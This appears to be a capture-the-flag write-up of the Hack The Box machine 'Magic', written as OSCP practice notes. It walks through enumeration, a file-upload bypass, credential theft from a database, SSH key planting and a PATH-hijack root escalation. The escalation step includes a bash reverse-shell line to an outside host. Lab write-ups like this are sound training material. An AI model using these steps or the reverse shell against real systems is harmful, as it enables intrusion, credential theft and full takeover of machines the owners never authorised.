## Reconnaissance
### Nmap Enumeration
- We pass the nmap commands (with output):
	```bash
nmap -sC -sV -vv -p- 10.10.10.185
nmap -sU --top-ports=10 -vv 10.10.10.185

---OUTPUT-TCP---
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ=
|   256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
---------------------------------------------------------------------------------
---OUTPUT-UDP---
445/udp  open|filtered microsoft-ds no-response
631/udp  open|filtered ipp          no-response
```
### Directory Search
- gobuster :
	```bash
gobuster dir -u http://magic.htb/ dns --wordlist /usr/share/wordlists/dirb/common.txt



---OUTPUT---
/.hta                 (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/.htpasswd            (Status: 403) [Size: 274]
/.sh_history          (Status: 403) [Size: 274]
/assets               (Status: 301) [Size: 307] [--> http://magic.htb/assets/]
/images               (Status: 301) [Size: 307] [--> http://magic.htb/images/]
/index.php            (Status: 200) [Size: 4053]
/server-status        (Status: 403) [Size: 274]
Progress: 4614 / 4615 (99.98%)

```
- dirsearch :
	```bash
dirsearch -u 10.10.10.185

---OUTPUT---
[11:03:59] 301 -  307B  - /assets  ->  http://magic.htb/assets/             
[11:04:11] 301 -  307B  - /images  ->  http://magic.htb/images/             
[11:04:14] 200 -    1KB - /login.php                                        
[11:04:15] 302 -    0B  - /logout.php  ->  index.php                        
[11:04:35] 302 -    3KB - /upload.php  ->  login.php                        
```
- ffuf : no output
- gobuster second search with images directory
	```bash
gobuster dir -u http://magic.htb/images/ dns --wordlist /usr/share/wordlists/dirb/big.txt

---OUTPUT---
/.htpasswd        (Status: 403) [Size: 274]
/.htaccess        (Status: 403) [Size: 274]
/uploads          (Status: 301) [Size: 315] [-->http://magic.htb/images/uploads/]
```
- We access http://magic.htb/images/uploads/mime_bypass.php.png with netcat listener listening.
	- we bypassed checs with magic bytes and adding .png in the end
- We gain reverse shell as www-data.
	- get better shell:
		```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
local_machine > stty raw -echo;fg
Enter+Enter
```
- Enumerating:
	```bash
cd /var/www/Magic
cat db.php5
ps -ex

---OUTPUT-1---
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
...
self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword)
--------
---OUTPUT-2---
  PID TTY      STAT   TIME COMMAND
 1821 ?        S      0:01 /usr/sbin/apache2 -k start
 1859 ?        R      0:01 /usr/sbin/apache2 -k start
 1867 ?        S      0:01 /usr/sbin/apache2 -k start
 1915 ?        S      0:00 /usr/sbin/apache2 -k start
 1922 ?        S      0:00 /usr/sbin/apache2 -k start
 1926 ?        S      0:00 /usr/sbin/apache2 -k start
 2100 ?        S      0:00 /usr/sbin/apache2 -k start
 2101 ?        S      0:00 /usr/sbin/apache2 -k start
 2102 ?        S      0:00 /usr/sbin/apache2 -k start
 2103 ?        S      0:00 /usr/sbin/apache2 -k start
 2108 ?        S      0:00 sh -c uname -a; w; id; /bin/sh -i APACHE_RUN_DIR=/var
 2112 ?        S      0:00 /bin/sh -i APACHE_RUN_DIR=/var/run/apache2 APACHE_PID
 2115 ?        S      0:00 python3 -c import pty;pty.spawn("/bin/bash") APACHE_R
 2116 pts/0    Ss     0:00 /bin/bash APACHE_RUN_DIR=/var/run/apache2 APACHE_PID_
 2216 pts/0    R+     0:00 ps -ex APACHE_LOG_DIR=/var/log/apache2 LANG=C INVOCAT
```
- MySQL Enumeration:
	```bash
mysql doesnt work
mysqldump -u theseus -p Magic >dump.sql
(Password:iamkingtheseus)
cat dump.sql

---OUTPUT---
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
```
	- We find creds:
		- Username : admin
		- Password: Th3s3usW4sK1ng
**NOTE: We can also use sqlmap here but didn't use for OSCP training. Also it might be a bit slow judging from IPPSecs video**
- We try to login as theseus with these credentials:
	```bash
su theseus
Password: Th3s3usW4sK1ng
```
	- We gain access as theseus.
- Create ssh link:
	```bash
---LOCAL-MACHINE---
ssh-keygen -f theseus 
cat theseus.pub > Copy key
--------------------------------------------------------------------------------
---TARGET-MACHINE---
cd /home/theseus/.ssh
echo "<public_key>" > authorized_keys
--------------------------------------------------------------------------------
---LOCAL-MACHINE---
chmod 0600 theseus
ssh -i theseus theseus@magic.htb
```
## Privilege Escalation
- Enumeration :
	```bash
sudo -l # cannot use
uname -a # Nothing interesting
find / -type f -perm -4000 2>/dev/null # find files with setuid privileges

---OUTPUT-OF-FIND-SETUID-FILES---
/bin/sysinfo
```
- we pass :
	```bash
strace -f /bin/sysinfo #to check system calls in a binary
```
	- We see an execve command
		- we search for other execve commands (Ctrl+Shift+F)
			```bash
execve("/bin/sh", ["sh", "-c", "lshw -short"], 0x7ffd9dc1c1b8 /* 18 vars */ <unfinished ...
execve("/bin/sh", ["sh", "-c", "fdisk -l"], 0x7ffd9dc1c1b8 /* 18 vars */) = 0
execve("/bin/sh", ["sh", "-c", "free -h"], 0x7ffd9dc1c1b8 /* 18 vars */ <unfinished ...>
```
			- **As we can see some of these execve commands don't use absolute path**
- We can create a file with our bash reverse shell script with the same name as one of the above (I've tried free and lshw, both worked)
	```bash
vi free

---INPUT---
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.25/9999 0>&1
```
- Make it an executable and then change the $PATH variable location to the current directory and execute the sysinfo binary (with netcat listener listening)
	```bash
chmod +x free
echo $PATH : 
export PATH=$(pwd):$PATH

---TO-CHECK---
---Have-Netcat-listener-waiting---
./free # if connects code is fine
------
---EXPLOIT---
/bin/sysinfo # With Netcat listener listening
```
	- We gain root shell.
		- Can add authorzed_key to this ssh folder too for ssh access.
